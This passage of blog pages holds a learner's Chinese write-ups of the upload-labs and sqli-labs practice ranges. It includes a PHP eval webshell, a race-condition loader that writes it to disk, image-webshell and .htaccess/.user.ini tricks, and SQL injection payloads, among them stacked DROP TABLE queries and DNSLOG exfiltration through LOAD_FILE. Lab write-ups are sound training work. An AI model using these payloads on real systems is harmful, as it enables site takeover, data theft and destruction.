+          <h3 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18(条件竞争)"></a>Pass-18(条件竞争)</h3><p>unlink() 函数是删除文件<br>代码审计，文件先上传到服务器再判断是否合法，合法则留下，不合法则删除<br><strong>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，<br>因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</strong><br><strong>跟c语言一样的语法，<br>fputs函数作用：向指定的文件写入一个字符串。<br>fopen：打开一个文件，<br>“w”(写入方式打开，清除文件内容，如果文件不存在则尝试重新创建.)</strong><br>构造php内容：<br><code>&lt;?php fputs(fopen(&#39;test.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39;); ?&gt;</code><br>这里注意：<strong>上传的文件名不能和新文件php名字一样，新文件成功生成了，旧文件不断上传，会把它覆盖掉，同样会被删除。</strong><br><strong>还需要双引号”cmd”,尝试单引号一直失败，单引号上传次数也很少，也不知道是为什么？<br>后面发现php单引号和双引号是有区别的，简单地说，单引号内的就直接看成字符串，双引号内的可以被解释。<br>我们通过在线编辑器来试探一下，<br><img src="3.md/1.png">会出现语法错误，因为双引号会解释内容，内容为一句话木马，会导致文件写入出现问题<br>这里还要复习一下一句话木马，@符号的意思是不报错，eval函数表示把括号内的语句字符串当作代码执行，所以在写入文件时<br>只能单纯的把一句话木马当作字符串处理；我们再把cmd换成单引号，语法也是错误的，cmd被分离出来了。<br><img src="3.md/2.png">这里错误就是意外出现字符串cmd，因为我们用来单引号，cmd就被认为字符串执行，我们可以把单引号去掉或加上双引号，发现两者都可以连接。<br>小结：为了区别这个折腾了很久，爆破了七十次，其实还是要找根本，发现php单引号双引号有区别。</strong><br>关于这个区别可以看看这篇文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/hyy147/article/details/90053272">https://blog.csdn.net/hyy147/article/details/90053272</a><br>下面是操作过程：<br>首先抓好两个包再进行爆破，抓包后，转换到intruder，先把要爆破的参数都去掉，因为这里我们是通过不断发包访问页面，而不是爆破值。<br><img src="3.md/3.png">再到payload修改，这里我标注了几个地方都要特别注意。<br><img src="3.md/4.png">就是设置没有payload，无限期地继续。<br>上面是不断上传php文件，同时我们还需要去打开它，访问它，所以新建一个访问页面<br><img src="3.md/5.png">抓包下来，修改同上面的一样，无需clear参数<br>最后修改一下线程为20，开始爆破。<br><img src="3.md/6.png">一下子就上传上去了，如果一直失败，要好好看看php内容有没有写错了。</p>
+<h3 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h3><p>分析源码，先判断了文件的后缀名，这里就不能直接上传php，考虑上传图片马。<br>然后是检查文件大小，检查文件是否存在，移动文件，重命名文件。<br>上传图片马，再用之前创建好的文件包含漏洞，<br><img src="3.md/7.png">提示我们本来就有一个文件包含，我们需要要它给的，<br>成功解析，<img src="3.md/8.png"><br>这里应该也是考图片马上传条件竞争，但是我的图片马上传没有问题，再解析一下即可，还有这里文件上传的路径也改变了。</p>
+<h3 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h3><p>这里我随便上传一个php都成功了，不知道出什么问题了，大概说一下网上师傅的做法。<br>方法一(0x00截断)：抓包会显示a.php**.jpg在**这加0x00截断，表示十六进制的00，访问的就是php文件了，jpg被截断了。<br>方法二：在php后缀加/.绕过，因为move_uploaded_file底层会调用函数tsrm_realpath，导致递归删除文件名最后的/.成功可以绕过后缀名的检测。<br>方法三：大小写绕过。</p>
+<h3 id="Pass-21-MIME-数组"><a href="#Pass-21-MIME-数组" class="headerlink" title="Pass-21(MIME,数组,/.)"></a>Pass-21(MIME,数组,/.)</h3><p>审计源码，先检查MIME<br>MIME:MIME消息可以包含文本、图像、音频、视频以及其他应用程序专用的数据。<br>再检查文件名，这里同样有的move_uploaded_file函数可以加/.绕过。<br>explode函数(separator,string,limit)把字符串打散成数组。<br>如果file变量不是数组，会将file变量先小写，再通过函数explode变成数组(以点为分隔符)如何取它的后缀名，并重新定义一个运行上穿的后缀名数组。<br>可以看到filename是文件本来的名称，而save_name是传递的参数,我们来构造参数名数组，设置两个元素的数组<br>经过函数处理，后缀就变成file[1],我们构造的有file[0],file[2],file[2]变为file[1]返回为空。<br><img src="/home/cookie/Blog/source/_posts/3/9.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+<div>
+  
+</div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/23/2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cat.jpg">
+      <meta itemprop="name" content="WJW">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WJW's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/23/2/" class="post-title-link" itemprop="url">upload-labs12~17</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-12-23 21:28:01" itemprop="dateCreated datePublished" datetime="2020-12-23T21:28:01+08:00">2020-12-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-06-15 12:38:52" itemprop="dateModified" datetime="2021-06-15T12:38:52+08:00">2021-06-15</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.6k</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><h4 id="白名单和黑名单"><a href="#白名单和黑名单" class="headerlink" title="白名单和黑名单"></a>白名单和黑名单</h4><p><strong>白名单：设置能通过的，白名单以外的不能通过。<br>黑名单:  不能通过，除黑名单以外可以通过。</strong><br>使用白名单，只允许jpg,png,gif，pass路径可控就很好处理了。<br>理解原理：$_GET[‘save_path’]函数是文件最终存储路径。代码里面拼接了一些随机字符，我们可以上传1.jpg，而在 save_path这个最终保存路径函数下面保存为1.php并加上%00来隔断后面的随机字符，这样实际存储到服务器上面路径上就是1.php的后缀了。<br>这里利用的是00截断。即move_uploaded_file函数的底层实现类似于C语言，遇到’\0’会截断。<br>在url中%00等价于ascii码中的0，表示字符串结束，读取结束。<br>截断条件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、php版本小于5.3.4</span><br><span class="line">2、php.ini的magic_quotes_gpc为OFF状态</span><br></pre></td></tr></table></figure>
+
+<p><img src="2.md/10.png"><br>上传白名单类型文件，抓包，在路径上添加ant.php%00<br><img src="2.md/11.png"><br>页面出错<br><img src="2.md/12.png"><br>把特殊符号删掉即可连接。<br><img src="2.md/13.png"><br>文件早已成功上传。也可以直接访问ant.php连接。</p>
+<p><img src="2.md/10.png"><br>上传白名单类型文件，抓包，在路径上添加ant.php%00<br><img src="2.md/11.png"><br>页面出错<br><img src="2.md/12.png"><br>把特殊符号删掉即可连接。<br><img src="2.md/13.png"><br>文件早已成功上传。也可以直接访问ant.php连接。</p>
+<h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>请求方式为POST，这里需要将%00url解码，post不像get可以自己解码。<br><img src="2.md/13.5.png"><br><img src="2.md/14.png">，成功上传。</p>
+<h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>gif头文件绕过，在一句话木马加GIF89a<br><img src="2.md/15.png">成功上传。<br><strong>制作图片木马</strong><br>先找到一个图片和制作一句话木马(这里可以以txt格式,php格式的文件都可以,我就用php的。)<br><img src="2.md/16.png"><br>因为这里的图片放在桌面，我们要在桌面的位置打开cmd进行操作。<br><img src="2.md/17.png"><br>使用copy命令制作，a表示ascii码文件，b表示二进制文件。<br><img src="2.md/18.png"><br><strong>如果php文件在前，jpg图片内容会复制在其后面，会出错。<br>如果jpg在前面，php一句话木马会复制在jpg内容后面，图片内容不会出错。<br>如果两者交换文件类型图片都无法正常显示。</strong><br>制作成功：<br><img src="2.md/19.png">无法显示。<br>这里不能直接连接图片获得websell，需要解析图片，我们通过文件包含漏洞解析。<br>建议看一下：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/3514f0fd79f7">https://www.jianshu.com/p/3514f0fd79f7</a><br>在upload目录下新建一个php文件写下：<br><code>&lt;?php  $file=$_GET[&#39;page&#39;]; include($file); ?&gt;</code><br>添加include.php这个访问路径，把图片解析成一句话木马。<br><img src="2.md/20.png">连接成功。<br><img src="2.md/21.png">    </p>
+<h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>提示：本pass使用getimagesize()检查是否为图片文件！<br>了解函数:用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。<br>这里特别的是它会检查图片内容，所以在copy图片马的时候，不能破坏图片内容，<br><code>copy 1.jpg/b + 2.php/a 666.jpg</code><br><img src="2.md/22.png">制作后，图片还是可以正常显示，用记事本打开内容，一句话木马在最末尾。<br>a表示以ascii写入，b表示二进制。<br><img src="2.md/23.png"></p>
+<h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>这里需要开启php_exif模块，新版的phpstudy没有那个插件，我就下回旧版的，上传图片马即可，十四至十六差不多，只是用了不同的函数检查，<br>都通过文件包含漏洞将图片解析，不同图片类型上传方式也是一样。</p>
+<h3 id="Pass-17-二次渲染"><a href="#Pass-17-二次渲染" class="headerlink" title="Pass-17(二次渲染)"></a>Pass-17(二次渲染)</h3><p>二次渲染:根据用户上传的图片，生成新的图片加入数据库，把原上传的图片删除。<br>先从gif类型图片马上传，上传成功，但是中国蚁剑连接失败，查看一下上传后图片的内容，一句话木马不见了，被二次渲染了。<br><img src="2.md/24.png">原图片的一句话木马是在末尾的，前面我们也有查看过。<br>先下载一个十六制编辑器windex，找到两个图片哪一个位置没有变化，把php代码写进去即可。<br><img src="2.md/25.png">可以连接成功，代码被执行了。<br>还有两种类型，都需要写脚本，相对比较复杂，这里就借鉴大佬的了：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-13">https://xz.aliyun.com/t/2657#toc-13</a></p>
+
+      
+    </div>
+
+    
+    
+    
+<div>
+  
+</div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/20/1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cat.jpg">
+      <meta itemprop="name" content="WJW">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WJW's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/20/1/" class="post-title-link" itemprop="url">upload-labs1~11</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-12-20 09:23:55" itemprop="dateCreated datePublished" datetime="2020-12-20T09:23:55+08:00">2020-12-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-06-15 12:21:16" itemprop="dateModified" datetime="2021-06-15T12:21:16+08:00">2021-06-15</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.8k</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>webshell：以网页文件形式存在的一种命令执行环境（是一种网页后门），即网页木马文件。<br><strong>题目中出现的UPLOAD_PATH都是我们靶场文件夹下面的upload文件夹，如果没有请手工创建。</strong><br><img src="1.md/00.jpg"></p>
+<h3 id="Pass-01-js检查"><a href="#Pass-01-js检查" class="headerlink" title="Pass-01(js检查)"></a>Pass-01(js检查)</h3><p><img src="1.md/01.png"><br>上传一句话木马，这明显的是一个js的alert提示框。我们就来尝试进行绕过。<br>第一关是一个针对于前端的验证，也就是使用JavaScript进行验证。</p>
+<h4 id="方法1：brup抓包改包绕过前端"><a href="#方法1：brup抓包改包绕过前端" class="headerlink" title="方法1：brup抓包改包绕过前端"></a>方法1：brup抓包改包绕过前端</h4><p>尝试上传一个jpg格式的图片，成功。<br><img src="1.md/0.png"><br>提示：本pass在客户端使用js对不合法图片进行检查!<br>判断文件后缀的代码在前端还是后端，尝试上传一句话木马，用burp进行抓包，并没有发包，说明后缀代码在前端。<br>将文件php后缀改成jpg后上传,可以上传<br><img src="1.md/1.png"><br>再进行抓包，在把后缀jpg改成php，forward。<br><img src="1.md/2.png"><br>查看图像地址，成功修改。<br><img src="1.md/3.png"><br>使用中国蚁剑连<br><img src="1.md/4.png"></p>
+<h4 id="方法2：审查元素，删除判断函数"><a href="#方法2：审查元素，删除判断函数" class="headerlink" title="方法2：审查元素，删除判断函数"></a>方法2：审查元素，删除判断函数</h4><p><img src="1.mg/5.png">删除这个函数再上传即可。</p>
+<h4 id="方法3-浏览器禁用js"><a href="#方法3-浏览器禁用js" class="headerlink" title="方法3:浏览器禁用js"></a>方法3:浏览器禁用js</h4><p><img src="1.md/00.png"><br>进去后搜索javascript.enabled改成flase即可。</p>
+<h3 id="Pass-02-content-type检查"><a href="#Pass-02-content-type检查" class="headerlink" title="Pass-02(content-type检查)"></a>Pass-02(content-type检查)</h3><p>mime:多用途互联网邮件扩展类型。<br>是设定某种扩展名的文件用一种应用程序来打开的方式类型（规定了扩展名）<br>其content-type（mime）是由客户端根据你上传的文件生成的，但限制只能是jpg/image格式，所以抓包改就好了.<br><img src="1.md/6.png"><br>尝试上传一句话木马，brup抓包，这次发包了。<br>查看源码，后端只检查了content-type，改包一下即可。</p>
+<h3 id="Pass-03-黑名单不全"><a href="#Pass-03-黑名单不全" class="headerlink" title="Pass-03(黑名单不全)"></a>Pass-03(黑名单不全)</h3><p>修改php后缀为php6即可，其他修改方式也可以，除了基础后缀可以，其他的可能需要经过特殊解析。</p>
+<h3 id="Pass-04-上传-htaccess"><a href="#Pass-04-上传-htaccess" class="headerlink" title="Pass-04(上传.htaccess)"></a>Pass-04(上传.htaccess)</h3><p>黑名单中很多后缀，但是没有.htaccess，我们可以上传.htaccess文件更改apache配置<br>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。<br>通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<br><code>&lt;FilesMatch &quot;hack.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</code>用记事本写脚本，把jpg修改成php格式，另存为.htaccess名，格式选择全部。</p>
+<h3 id="Pass-05-上传-user-ini"><a href="#Pass-05-上传-user-ini" class="headerlink" title="Pass-05(上传.user.ini)"></a>Pass-05(上传.user.ini)</h3><p><strong>php.ini是php的配置文件,.user.ini中的字段也会被php视为配置文件来处理，从而导致php的文件解析漏洞。</strong></p>
+<p>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是.user.ini。<br>引发.user.ini三个条件:服务器语言为php；<br>        服务器使用CGI或FastCGI模式；<br>        上传目录下要有可执行的php文件。<br>我们上传一个内容为auto_prepend_file=1.gif的.user.ini文件，然后在上传一个命名为1.gif的一句话木马，<br>再连接的时候把文件名改成readme.php(这个文件要等待一定时间才能写好。)<br>**.user.ini文件里的意思是 所有文件都自动包含1.gif文件。.user.ini相当于一个用户自定义的php.ini。* </p>
+<h3 id="Pass-06-大小写绕过"><a href="#Pass-06-大小写绕过" class="headerlink" title="Pass-06(大小写绕过)"></a>Pass-06(大小写绕过)</h3><h3 id="Pass-07-后缀名加空格"><a href="#Pass-07-后缀名加空格" class="headerlink" title="Pass-07(后缀名加空格)"></a>Pass-07(后缀名加空格)</h3><h3 id="Pass-08-后缀名加-过滤"><a href="#Pass-08-后缀名加-过滤" class="headerlink" title="Pass-08(后缀名加.过滤)"></a>Pass-08(后缀名加.过滤)</h3><p>原理:Windows系统在存储文件时会自动去掉文件名末尾的点和空格。<br>这里url末尾的点，对资源的访问没啥影响，我试了一下，多加几个点或者不加点都能访问到，但是换成其他字符不行。</p>
+<h3 id="Pass-09-后缀名加-DATA"><a href="#Pass-09-后缀名加-DATA" class="headerlink" title="Pass-09(后缀名加::$DATA)"></a>Pass-09(后缀名加::$DATA)</h3><p>原理:在php+Windows的环境下，如果文件名+::$DATA会把::$DATA之后的数据当成文件流处理,不会检测后缀名,且保持::$DATA之前的文件名<br><img src="1.md/8.png"><br>查看图片<br><img src="1.md/9.png">将后缀::DATA去掉即可。<br>用中国蚁剑连接成功。</p>
+<h3 id="Pass-10-点空格点过滤"><a href="#Pass-10-点空格点过滤" class="headerlink" title="Pass-10(点空格点过滤)"></a>Pass-10(点空格点过滤)</h3><h3 id="Pass-11-双写php过滤-，pphphp跟sql双写注入类似。pphphp被过滤后还剩php。"><a href="#Pass-11-双写php过滤-，pphphp跟sql双写注入类似。pphphp被过滤后还剩php。" class="headerlink" title="Pass-11(双写php过滤)，pphphp跟sql双写注入类似。pphphp被过滤后还剩php。"></a>Pass-11(双写php过滤)，pphphp跟sql双写注入类似。pphphp被过滤后还剩php。</h3><p>​        </p>
+<p>补充：</p>
+<p>在Apache的解析顺序中，是从右到左解析，如果最右侧的扩展名不可识别，就继续往左判断，直到可解析为止</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果上传文件名为1.php.xxxx</span><br><span class="line">因为后缀xxxx无法解析，所以只能解析1.php</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+<div>
+  
+</div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/14/sqli-labs/46/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cat.jpg">
+      <meta itemprop="name" content="WJW">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WJW's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/14/sqli-labs/46/" class="post-title-link" itemprop="url">sqli-labs46~53</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-12-14 20:37:09" itemprop="dateCreated datePublished" datetime="2020-12-14T20:37:09+08:00">2020-12-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-23 09:35:32" itemprop="dateModified" datetime="2021-05-23T09:35:32+08:00">2021-05-23</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>689</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h3><p><img src="46.md/00.png"><br>从题目看出与order by有关。<br>而且参数也换成了sort。<br>输入后，出现一个表格。<br>尝试sort=1 asc和sort=1 desc，分别显示升序和降序的表格，说明此处是注入点，即注入点在order by后的参数中，<br><img src="46.md/0.png"></p>
+<p><img src="46.md/1.png"><br>了解一下order by怎么注入？<br>order by 后面的数字可以作为一个注入点，我们尝试报错注入成功。<br><img src="46.md/2.png"></p>
+<h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><p>加单引号即可。</p>
+<h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><p>没有报错的，采用时间盲注成功。</p>
+<h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><p>加单引号即可。</p>
+<h3 id="Less-51-53"><a href="#Less-51-53" class="headerlink" title="Less-51~53"></a>Less-51~53</h3><p>排序堆叠注入。<br>eg:<br><img src="46.md/3.png"></p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>靶场到这边就刷完了，来小小总结一下。</p>
+<h4 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h4><p>漏洞类型分为两种：<strong>字符型，数字型。</strong></p>
+<h4 id="判断是否存在sql注入"><a href="#判断是否存在sql注入" class="headerlink" title="判断是否存在sql注入"></a>判断是否存在sql注入</h4><p>最经典的：<strong>加单引号</strong>，无论是字符型还是数字型都会报错，页面显示异常。<br>字符型：通过and’1’=’1 和and’1’=’2<br>如果第一个页面显示正常，第二个无正常显示，则存在字符型sql注入，因为sql语句可以被执行，程序没有对敏感字符过滤。<br>数字型：1=1 和1=2进行判断，同上。</p>
+<h4 id="注入手法"><a href="#注入手法" class="headerlink" title="注入手法"></a>注入手法</h4><p>工具注入：最省力，sqlmap可以快速爆出数据，但缺点是大多数时候即使存在sql注入，也爆不出来。<br>还有写python盲注脚本。<br><strong>手工注入：联合查询注入<br>    报错注入(三种方法)<br>    盲注(布尔盲注，时间盲注)<br>    堆叠注入(加;再多构造一句sql语句注入)<br>    二次注入(通过创建同名加特殊字符加过滤实现对原用户的密码进行修改)利用相关修改密码sql语句。<br>    双写大小写绕过注入<br>    写入一句话木马<br>    双服务器过滤(通过&amp;再构造一个参数绕过)<br>    宽字节注入</strong><br><em>这里只是一个大概，感觉刷靶场花费的时间感觉还是太长，没有适应这种学习方式，也仅仅是刚刚开始，希望后续的学习能逐渐提高…</em> 
+    </p>
+
+      
+    </div>
+
+    
+    
+    
+<div>
+  
+</div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/12/sqli-labs/38/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cat.jpg">
+      <meta itemprop="name" content="WJW">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WJW's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/12/sqli-labs/38/" class="post-title-link" itemprop="url">sqli-labs38~45</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-12-12 12:35:34" itemprop="dateCreated datePublished" datetime="2020-12-12T12:35:34+08:00">2020-12-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-23 09:35:22" itemprop="dateModified" datetime="2021-05-23T09:35:22+08:00">2021-05-23</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>998</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="读文件——DNSLOG外带"><a href="#读文件——DNSLOG外带" class="headerlink" title="读文件——DNSLOG外带"></a>读文件——DNSLOG外带</h3><p>使用网站<a target="_blank" rel="noopener" href="http://dnslog.cn/">http://dnslog.cn/</a></p>
+<h4 id="UNC路径-只存在windows系统"><a href="#UNC路径-只存在windows系统" class="headerlink" title="UNC路径(只存在windows系统)"></a>UNC路径(只存在windows系统)</h4><p>格式：\servername\sharename,其中severname是服务器名，sharename是共享资源的名称。<br><code>?id=1&#39;;select 1,2,LOAD_FILE(group_concat(&#39;\\\\&#39;),mysql查询语句,&#39;域名\\abc&#39;)</code><br>第一个相当于转义两个\,可以把想要的信息放在子域名。</p>
+<h3 id="堆叠注入。"><a href="#堆叠注入。" class="headerlink" title="堆叠注入。"></a>堆叠注入。</h3><p><strong>mysqli_multi_query() 函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。</strong></p>
+<p>复习一下，调用数据库时，可以不加；</p>
+<h3 id="38"><a href="#38" class="headerlink" title="38"></a>38</h3><p>通过与注入点加;分隔开加新的注入。<br>打开后台数据库检验。<br>创表<br><code>?id=1&#39;;create table test like users--+</code><br><img src="38.md/1.png"><br><img src="38.md/0.png"></p>
+<p>还可以直接用MySQL语句创表：<br><code>?id=1&#39;;insert into users(id,username,password)values(16,&#39;fafu&#39;,&#39;fafu&#39;)--+</code>记得字符要加单引号或者双引号。<br><img src="38.md/2.png"><br><code>?id=1&#39;;create table test like aaa;</code>后面加分号也可以的。<br><code>?id=1&#39;;drop table test--+</code><br><strong>补充：这里创表需要加like users 是因为创表需要知道字段名还有字段类型。</strong></p>
+<h3 id="39"><a href="#39" class="headerlink" title="39"></a>39</h3><p>为数字型，也是堆叠注入。</p>
+<h3 id="40"><a href="#40" class="headerlink" title="40"></a>40</h3><p>改成’)即可</p>
+<h3 id="41"><a href="#41" class="headerlink" title="41"></a>41</h3><p>也是数字型注入,错误不回显，盲注。</p>
+<h3 id="42"><a href="#42" class="headerlink" title="42"></a>42</h3><p>这里和24关有点相似，我们尝试创建新用户，失败了，被发现了。<br>看了一下源码，猜测注入点在password，开始尝试。创建新用户失败，用原来的账户密码登陆。<br>跳到改密码页面，把密码改成’#后缀的，再次用次密码登陆，登陆失败，嘿嘿嘿，注入点来了。<br>直接构造报错函数：<br><code>&#39; and updatexml(1,concat(0x7c,database()),1)#</code>，ok成功。<br><strong>堆叠注入</strong><br>在password构造，<br><code>1&#39;;create table test1 like users#</code>可以注入。<br>因为输入密码时是看不见的，这里建议，先写打在记事本上，在复制粘贴。</p>
+<h3 id="43"><a href="#43" class="headerlink" title="43"></a>43</h3><p>改成’)即可。</p>
+<h3 id="44"><a href="#44" class="headerlink" title="44"></a>44</h3><p>这一关没有报错信息，盲注</p>
+<h3 id="45"><a href="#45" class="headerlink" title="45"></a>45</h3><p>也没有报错信息，可以盲注<br>看了大佬博客，以上关卡，也是堆叠注入类型的，通过在password上构造payload，这里不再赘述。</p>
+
+      
+    </div>
+
+    
+    
+    
+<div>
+  
+</div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/12/sqli-labs/32/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cat.jpg">
+      <meta itemprop="name" content="WJW">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WJW's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/12/sqli-labs/32/" class="post-title-link" itemprop="url">sqli-labs32~35</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-12-12 11:17:03" itemprop="dateCreated datePublished" datetime="2020-12-12T11:17:03+08:00">2020-12-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
